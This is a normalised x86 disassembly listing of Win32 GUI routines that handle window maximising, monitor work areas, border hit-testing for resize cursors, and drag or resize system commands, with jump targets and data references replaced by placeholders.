mov edx [ eax + 0xc ]
mov eax [ esi + 0x1b0 ]
push eax
mov [ esi + 0x3c ] edx
call [ IsZoomed@IAT ]
test eax eax
je r-xdata
mov edi [ GetClientRect@IAT ]
lea eax [ esi + 0x50 ]
push eax
mov eax [ esi + 0x1b0 ]
push eax
call edi
mov edx [ esi + 0x1b0 ]
lea ecx [ esi + 0x30 ]
push ecx
push edx
call edi
add esi 0x270
push esi
call [ SetRectEmpty@IAT ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x25c ]
add ecx 0x174
mov edx edi
lea eax [ ebp - 0x10 ]
call sub_40e630
mov edx [ eax ]
mov [ esi + 0x270 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0x274 ] ecx
mov edx [ eax + 0x8 ]
mov ecx [ edi ]
mov [ esi + 0x278 ] edx
mov eax [ eax + 0xc ]
mov edx [ edi + 0x4 ]
mov [ esi + 0x260 ] ecx
mov [ esi + 0x264 ] edx
mov edx [ esi + 0x34 ]
mov [ esi + 0x27c ] eax
mov eax [ edi + 0x8 ]
mov [ esi + 0x268 ] eax
pop edi
mov [ esi + 0x26c ] edx
pop esi
mov esp ebp
pop ebp
retn
mov [ esi + 0x30 ] 0x0
mov ecx [ edi + 0x8 ]
sub ecx [ edi ]
mov [ esi + 0x38 ] ecx
sub_416740
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
push edi
mov esi ecx
mov ecx [ ebp + 0x10 ]
push ecx
push edx
push eax
call [ DefWindowProcW@IAT ]
mov eax [ esi + 0x25c ]
mov edx [ eax + 0x164 ]
mov ecx [ eax + 0x16c ]
mov ebx [ eax + 0x168 ]
mov eax [ eax + 0x170 ]
sub ecx edx
sub eax ebx
je r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ esi + 0x48 ]
sub eax [ esi + 0x44 ]
sub ecx [ esi + 0x40 ]
test ecx ecx
jne r-xdata
push 0x0
call [ GetSystemMetrics@IAT ]
push 0x1
call [ GetSystemMetrics@IAT ]
jmp r-xdata
push 0x2
push ecx
call ebx
xor ecx ecx
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x28 ] ecx
push eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x4c ] ecx
mov [ esp + 0x50 ] ecx
mov [ esp + 0x2c ] 0x28
call [ GetMonitorInfoW@IAT ]
cmp [ esp + 0x28 ] 0x0
jne r-xdata
mov edx [ esi ]
mov edx [ edx + 0xf0 ]
push eax
push ecx
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
call edx
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov ebx [ MonitorFromWindow@IAT ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x1c ] ecx
mov ecx [ esi + 0x1b0 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
cmp ecx eax
je r-xdata
mov esi [ esi + 0x1b0 ]
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
cmp esi eax
je r-xdata
mov ecx [ esp + 0x4c ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
cmp [ esp + 0x2c ] 0x0
jne r-xdata
push eax
lea edx [ esp + 0x18 ]
push edx
push eax
push 0x30
call [ SystemParametersInfoW@IAT ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
push 0x2
push esi
call ebx
xor ecx ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] ecx
lea ecx [ esp + 0x24 ]
push ecx
push eax
mov [ esp + 0x2c ] 0x28
call [ GetMonitorInfoW@IAT ]
mov esi [ esp + 0x38 ]
mov edx [ esp + 0x3c ]
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x44 ]
jmp r-xdata
sub ecx esi
sub eax edx
mov [ edi + 0x10 ] esi
mov [ edi + 0x14 ] edx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] eax
sub_416930
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi - 0x70 ]
mov edx [ eax + 0x74 ]
lea ecx [ esi - 0x70 ]
push edi
call edx
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ esi + 0xf0 ]
mov ecx [ esi - 0x14 ]
sub ecx [ esi - 0x1c ]
mov edx [ esi - 0x18 ]
sub edx [ esi - 0x20 ]
push 0xcc0020
push 0x0
push 0x0
push eax
mov eax [ ebp + 0x18 ]
push ecx
push edx
push 0x0
push 0x0
push eax
call [ BitBlt@IAT ]
mov ebx [ esi + 0x8 ]
sub ebx [ esi + 0x4 ]
xor eax eax
sar ebx 0x2
mov [ ebp - 0x4 ] eax
test ebx ebx
jle r-xdata
lea ebx [ ebx ]
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
mov edx [ edi ]
mov eax [ edx + 0x74 ]
mov ecx edi
call eax
test al al
je r-xdata
mov ecx [ esi + 0x4 ]
mov edi [ ecx + eax * 4 ]
test edi edi
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x58 ]
mov ecx edi
call eax
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edi [ eax ]
push ecx
mov ecx [ esi - 0x20 ]
sub esp 0x10
mov edx esp
mov [ edx ] ecx
mov ecx [ esi - 0x1c ]
mov [ edx + 0x4 ] ecx
mov ecx [ esi - 0x18 ]
mov [ edx + 0x8 ] ecx
mov ecx [ esi - 0x14 ]
mov [ edx + 0xc ] ecx
mov edx [ edi + 0x80 ]
mov ecx eax
call edx
sub_416a00
push ebp
mov ebp esp
cmp [ ecx + 0x24d ] 0x0
je r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x110 ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ecx + 0x1b0 ]
push edx
call eax
pop ebp
retn 0x8
mov [ ecx + 0x21c ] 0x0
xor eax eax
pop ebp
retn 0x8
sub_416a40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
xor esi esi
mov ebx ecx
push edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
cmp eax esi
jne r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] edx
lea eax [ esp + 0x18 ]
push eax
call [ GetCursorPos@IAT ]
jmp r-xdata
mov [ esp + 0x14 ] 0x2
test al al
jne r-xdata
movzx edx al
neg edx
sbb edx edx
and edx 0xffffffe9
add edx 0x19
jmp r-xdata
mov ecx [ ebx + 0x1b0 ]
lea eax [ esp + 0x2c ]
push eax
push ecx
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] esi
mov [ esp + 0x3c ] esi
mov [ esp + 0x40 ] esi
call [ GetWindowRect@IAT ]
mov al [ ebx + 0x284 ]
mov edx [ ebx + 0x26c ]
xor ecx ecx
test al al
sete cl
add ecx 0x2
sub edx [ ebx + 0x264 ]
jne r-xdata
mov edx [ esp + 0x2c ]
mov esi [ esp + 0x18 ]
movzx eax al
neg eax
sbb eax eax
and eax 0xfffffff9
add edx ecx
add eax 0xc
cmp esi edx
mov edx [ esp + 0x1c ]
mov [ esp + 0x20 ] 0x1
jg r-xdata
mov [ esp + 0x14 ] edx
mov edi [ esp + 0x34 ]
sub edi ecx
mov [ esp + 0x28 ] edi
cmp esi edi
jl r-xdata
mov edi [ esp + 0x30 ]
add edi ecx
cmp edx edi
jle r-xdata
mov ebx [ esp + 0x30 ]
add ebx [ esp + 0x14 ]
cmp edx ebx
mov ebx [ esp + 0x2c ]
jg r-xdata
mov edi [ esp + 0x30 ]
add edi ecx
cmp edx edi
jle r-xdata
mov edi [ esp + 0x38 ]
sub edi eax
cmp edx edi
jge r-xdata
mov edi [ esp + 0x38 ]
sub edi ecx
cmp edx edi
jl r-xdata
lea edi [ ebx + ecx ]
cmp esi edi
jle r-xdata
mov edi [ esp + 0x38 ]
sub edi eax
cmp edx edi
jge r-xdata
mov edi 0xa
jmp r-xdata
lea edi [ ebx + ecx ]
cmp esi edi
jg r-xdata
lea edi [ ebx + eax ]
cmp esi edi
jle r-xdata
cmp esi [ esp + 0x28 ]
jge r-xdata
mov edi 0xb
jmp r-xdata
mov ecx [ ebx + 0x1b0 ]
push ecx
call [ IsZoomed@IAT ]
test eax eax
je r-xdata
cmp esi [ esp + 0x28 ]
jl r-xdata
mov edi [ esp + 0x30 ]
add edi ecx
cmp edx edi
jg r-xdata
mov edi [ esp + 0x34 ]
sub edi eax
cmp esi edi
jge r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ esp + 0x10 ]
add eax ecx
xor ecx ecx
cmp edx eax
setg cl
lea edi [ ecx - 0x1 ]
and edi 0xa
add edi 0x2
cmp edi 0x2
jne r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x30 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esp + 0x38 ]
add ebx eax
cmp esi ebx
jg r-xdata
mov edi [ esp + 0x30 ]
add edi ecx
cmp edx edi
jg r-xdata
mov edi 0xd
jmp r-xdata
mov edi 0xf
jmp r-xdata
mov eax [ ebx + 0x1b0 ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
mov eax edi
cmp [ ebx + 0x24c ] 0x0
jne r-xdata
mov edi [ esp + 0x34 ]
sub edi eax
cmp esi edi
jl r-xdata
mov edi ecx
sub edi eax
cmp edx edi
jl r-xdata
mov edi 0xe
jmp r-xdata
mov ebx [ esp + 0x10 ]
mov [ esp + 0x24 ] edx
lea edx [ esp + 0x20 ]
push edx
push eax
mov [ esp + 0x28 ] esi
call [ ScreenToClient@IAT ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
mov edx [ ebx + 0x1b0 ]
push eax
push ecx
push edx
lea eax [ ebx + 0x70 ]
push eax
call sub_412e50
test al al
je r-xdata
mov eax 0x1
cmp edi 0x2
jne r-xdata
mov edi [ esp + 0x20 ]
sub ecx eax
cmp edx ecx
jl r-xdata
mov edi 0x10
jmp r-xdata
lea eax [ edi - 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x30 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esp + 0x3c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edi 0x11
jmp r-xdata
sub_416ce0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx ecx
cmp [ ebx + 0x24d ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
mov [ ebx + 0x21c ] 0x0
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebx + 0x25c ] 0x0
je r-xdata
movzx eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebx + 0x1b0 ]
push esi
push edi
shl eax 0x10
or eax 0x1
push eax
push ecx
push 0x20
push edx
lea edi [ ebx + 0x70 ]
lea esi [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x0
call sub_4130a0
cmp [ ebp - 0x1 ] 0x0
pop edi
pop esi
jne r-xdata
cmp eax 0x2
je r-xdata
cmp [ ebx + 0x24c ] 0x0
je r-xdata
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x1b0 ]
je r-xdata
push 0x7f00
cmp eax 0x3
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
cmp eax 0x200
je r-xdata
cmp eax 0x5
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x114 ]
mov ecx ebx
call eax
test eax eax
je r-xdata
cmp eax 0x201
jne r-xdata
cmp eax 0x1
je r-xdata
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x110 ]
push 0x0
push eax
mov ecx ebx
call edx
mov [ ebp + 0xc ] eax
cmp eax 0xc
je r-xdata
push 0x7f85
jmp r-xdata
cmp eax 0xf
je r-xdata
push 0x0
call [ LoadCursorW@IAT ]
push eax
call [ SetCursor@IAT ]
cmp eax 0xa
je r-xdata
push 0x7f84
jmp r-xdata
cmp eax 0xb
je r-xdata
cmp eax 0xd
je r-xdata
push 0x7f82
jmp r-xdata
cmp eax 0x11
je r-xdata
cmp eax 0xe
je r-xdata
push 0x7f83
jmp r-xdata
cmp eax 0x10
jne r-xdata
sub_416e20
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x24d ] bl
je r-xdata
mov eax [ esi + 0x1b0 ]
push eax
call [ SetForegroundWindow@IAT ]
mov eax [ ebp + 0x8 ]
cmp [ esi + 0x25c ] ebx
je r-xdata
mov [ esi + 0x21c ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp eax 0xc
jne r-xdata
cmp [ esi + 0x24c ] bl
jne r-xdata
cmp eax 0x2
jne r-xdata
movzx ecx [ ebp + 0x10 ]
movzx edx [ ebp + 0xc ]
mov eax [ esi + 0x1b0 ]
shl ecx 0x10
or ecx edx
push ecx
push 0xf003
push 0x112
push eax
call [ SendMessageW@IAT ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp eax 0x2
jne r-xdata
cmp eax 0xf
jne r-xdata
mov ecx [ esi + 0x1b0 ]
push ecx
call [ IsZoomed@IAT ]
test eax eax
jne r-xdata
cmp eax 0xa
jne r-xdata
movzx edx [ ebp + 0x10 ]
movzx eax [ ebp + 0xc ]
shl edx 0x10
or edx eax
push edx
push 0xf006
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] ebx
call [ GetCursorPos@IAT ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov [ esi + 0x28c ] 0x1
mov [ esi + 0x290 ] eax
mov [ esi + 0x294 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp eax 0xb
jne r-xdata
movzx edx [ ebp + 0x10 ]
movzx eax [ ebp + 0xc ]
shl edx 0x10
or edx eax
push edx
push 0xf001
jmp r-xdata
mov ecx [ esi + 0x1b0 ]
push 0x112
push ecx
call [ SendMessageW@IAT ]
cmp eax 0xd
jne r-xdata
movzx edx [ ebp + 0x10 ]
movzx eax [ ebp + 0xc ]
shl edx 0x10
or edx eax
push edx
push 0xf002
jmp r-xdata
cmp eax 0xe
jne r-xdata
movzx edx [ ebp + 0x10 ]
movzx eax [ ebp + 0xc ]
shl edx 0x10
or edx eax
push edx
push 0xf004
jmp r-xdata
cmp eax 0x10
jne r-xdata
movzx edx [ ebp + 0x10 ]
movzx eax [ ebp + 0xc ]
shl edx 0x10
or edx eax
push edx
push 0xf005
jmp r-xdata
cmp eax 0x11
jne r-xdata
movzx edx [ ebp + 0x10 ]
movzx eax [ ebp + 0xc ]
shl edx 0x10
or edx eax
push edx
push 0xf007
jmp r-xdata
movzx edx [ ebp + 0x10 ]
movzx eax [ ebp + 0xc ]
shl edx 0x10
or edx eax
push edx
push 0xf008
sub_416fd0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ SystemParametersInfoW@IAT ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
mov [ ebp - 0x4 ] 0x0
call esi
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x1
push 0x25
mov [ ecx + 0x280 ] 0x0
call esi
sub_417020
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x24d ] bl
je r-xdata
cmp [ esi + 0x24e ] bl
je r-xdata
cmp [ esi + 0x258 ] bl
je r-xdata
pop esi
pop ebx
retn
mov ecx [ esi + 0x1b0 ]
push ecx
call [ IsZoomed@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x254 ]
push 0x1
push ebx
push eax
call [ SetWindowRgn@IAT ]
mov [ esi + 0x258 ] bl
pop esi
pop ebx
retn
cmp [ esi + 0x158 ] ebx
jne r-xdata
cmp [ esi + 0x258 ] bl
je r-xdata
mov eax [ esi + 0x170 ]
mov ecx [ eax ]
xor ecx ecx
jmp r-xdata
mov edx [ esi + 0x254 ]
push 0x1
push ebx
push edx
call [ SetWindowRgn@IAT ]
mov [ esi + 0x258 ] bl
pop esi
pop ebx
retn
mov edx [ esi + 0x1b0 ]
lea ebx [ esi + 0x250 ]
push edx
call sub_426fd0
sub_4170c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
xor edi edi
cmp ebx [ esi + 0x1b0 ]
je r-xdata
mov ecx [ esi + 0x1b0 ]
push 0x1
push edi
mov edi [ ebp + 0xc ]
push ecx
call sub_417180
pop edi
pop esi
movzx eax al
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x201
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x114 ]
call edx
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
call [ GetCursorPos@IAT ]
mov edx [ esi ]
mov edx [ edx + 0x110 ]
lea eax [ esp + 0x10 ]
push eax
push ebx
mov ecx esi
call edx
cmp eax 0x1
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx ecx [ esp + 0x14 ]
movzx edx [ esp + 0x10 ]
shl ecx 0x10
or ecx edx
push ecx
push eax
mov eax [ esi + 0x1b0 ]
push 0xa1
push eax
call [ SendMessageW@IAT ]
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_417180
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ esi + 0x1b0 ]
sub esp 0xc
push ebx
push eax
call [ IsZoomed@IAT ]
cmp edi 0x201
jne r-xdata
cmp edi 0xa1
jne r-xdata
test eax eax
jmp r-xdata
cmp edi 0x202
je r-xdata
test eax eax
jmp r-xdata
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
jne r-xdata
cmp edi 0xa2
je r-xdata
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edi 0x2a3
jne r-xdata
cmp ebx [ esi + 0x1b0 ]
je r-xdata
cmp edi 0x200
je r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ esi + 0x1b0 ] ebx
jne r-xdata
push esi
mov eax ebx
call sub_417400
test al al
je r-xdata
cmp edi 0xa0
je r-xdata
lea eax [ esp + 0x8 ]
push eax
call [ GetCursorPos@IAT ]
mov eax [ ebp + 0xc ]
movsx ecx ax
shr eax 0x10
movsx edx ax
mov [ esp + 0x8 ] ecx
mov [ esp + 0xc ] edx
jmp r-xdata
mov [ esi + 0x28c ] 0x0
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edi 0x2a3
je r-xdata
xor bl bl
jmp r-xdata
cmp edi 0xa1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
sete bl
cmp edi 0xa0
je r-xdata
cmp edi 0x2a2
cmp edi 0x201
je r-xdata
test bl bl
je r-xdata
mov [ esi + 0x28c ] 0x0
test bl bl
je r-xdata
cmp edi 0xa1
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push ecx
push edx
lea eax [ esi + 0x30 ]
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov [ esi + 0x28c ] 0x1
mov [ esi + 0x290 ] eax
mov [ esi + 0x294 ] ecx
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
lea edx [ esi + 0x70 ]
push edx
call sub_412e50
test al al
jne r-xdata
cmp edi 0x202
je r-xdata
cmp [ esi + 0x28c ] 0x0
je r-xdata
cmp edi 0xa2
je r-xdata
mov [ esi + 0x28c ] 0x0
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edi 0x200
je r-xdata
cmp [ esi + 0x28c ] 0x0
je r-xdata
cmp edi 0xa0
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x114 ]
mov ecx esi
call eax
test eax eax
je r-xdata
cmp [ esi + 0x28d ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esi + 0x290 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jg r-xdata
cmp [ esi + 0x280 ] 0x0
mov [ esi + 0x28c ] 0x0
jne r-xdata
push esi
mov [ esi + 0x28d ] 0x1
call sub_416fd0
mov ecx [ esi + 0x1b0 ]
push 0x0
push 0xf012
push 0x112
push ecx
call [ PostMessageW@IAT ]
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ esp + 0xc ]
sub eax [ esi + 0x294 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jle r-xdata
push 0x0
push 0x0
push 0x0
push 0x25
call [ SystemParametersInfoW@IAT ]
mov [ esi + 0x280 ] 0xffffffff
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_417400
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ GetWindowLongW@IAT ]
mov esi eax
push 0xfffffff0
push esi
call edi
test eax eax
jns r-xdata
push ebx
mov ebx [ GetParent@IAT ]
push esi
mov [ ebp - 0x1 ] 0x0
call ebx
mov esi eax
test esi esi
je r-xdata
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn 0x4
mov al [ ebp - 0x1 ]
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x1b0 ]
je r-xdata
mov [ ebp - 0x1 ] 0x1
push 0xfffffff0
push esi
call edi
test eax eax
js r-xdata
push esi
call ebx
mov esi eax
test esi esi
jne r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_417470
push ebp
mov ebp esp
push ebx
push edi
mov edi eax
xor eax eax
mov [ esi + 0x24 ] al
cmp [ rw-data ] eax
jne r-xdata
cmp ecx eax
je r-xdata
mov [ rw-data ] eax
cmp [ ebp + 0x1c ] eax
je r-xdata
xor edx edx
mov [ rw-data ] dx
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ esi + 0x20 ]
push ecx
mov ebx rw-data
call sub_406b60
add esp 0x8
movzx ebx ax
test edi edi
jne r-xdata
and [ rw-data ] 0xfffffffc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edi 0x56000000
mov edx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push ecx
push edx
push eax
mov eax esi
call sub_430650
pop edi
pop ebx
pop ebp
retn 0x18
mov [ ebp + 0x10 ] 0x0
sub_417540
push ebp
mov ebp esp
push 0xffffffff
push sub_447ef1
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x140 ]
call sub_427df0
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x70 ]
call sub_412b40
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4175d0
push ebp
mov ebp esp
push 0xffffffff
push sub_447ef1
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x140 ]
call sub_427df0
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x70 ]
call sub_412b40
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_417660
push ebp
mov ebp esp
push 0xffffffff
push sub_449e50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
cmp [ esi + 0x13c ] ebx
je r-xdata
call sub_4177c0
mov eax r--data
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x74 ]
mov edx [ esi + 0x78 ]
sub edx eax
xor ecx ecx
sar edx 0x2
mov [ ebp - 0x10 ] ecx
test edx edx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x80 ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call edx
mov edi eax
mov eax [ esi ]
mov edx [ eax + 0x84 ]
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx esi
call edx
test eax eax
jne r-xdata
lea esp [ esp ]
mov esi 0x1
cmp edi ebx
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ esi + 0x78 ]
mov ecx [ ebp - 0x10 ]
sub edx eax
inc ecx
sar edx 0x2
xor ebx ebx
mov [ ebp - 0x10 ] ecx
cmp ecx edx
jb r-xdata
mov eax [ esi ]
mov edx [ eax + 0x7c ]
push edi
mov ecx esi
call edx
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
mov edi [ eax + ecx * 4 ]
cmp edi ebx
je r-xdata
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x24 ]
call sub_427df0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x38 ]
call sub_427df0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax + 0x74 ]
mov ecx edi
call edx
test al al
jne r-xdata
cmp [ ebx + 0x34 ] 0x4
push edi
jne r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
lea edx [ ebp - 0x24 ]
push edx
lea ecx [ ebp - 0x38 ]
push ecx
jmp r-xdata
mov eax [ ebx + 0x58 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
call sub_427ec0
sub_4177c0
push edi
push 0x80
lea edi [ esi + 0xbc ]
push 0x0
push edi
call memset
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x34 ]
mov [ edi ] eax
mov eax [ esi + 0x3c ]
mov [ esi + 0xc8 ] eax
mov [ esi + 0xc4 ] edx
mov [ esi + 0xc0 ] ecx
mov eax ecx
sub eax [ esi + 0x30 ]
mov ecx [ esi + 0x50 ]
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0xd0 ] eax
mov [ esi + 0xcc ] eax
mov eax [ esi + 0x3c ]
sub eax [ esi + 0x34 ]
add esp 0xc
cdq
sub eax edx
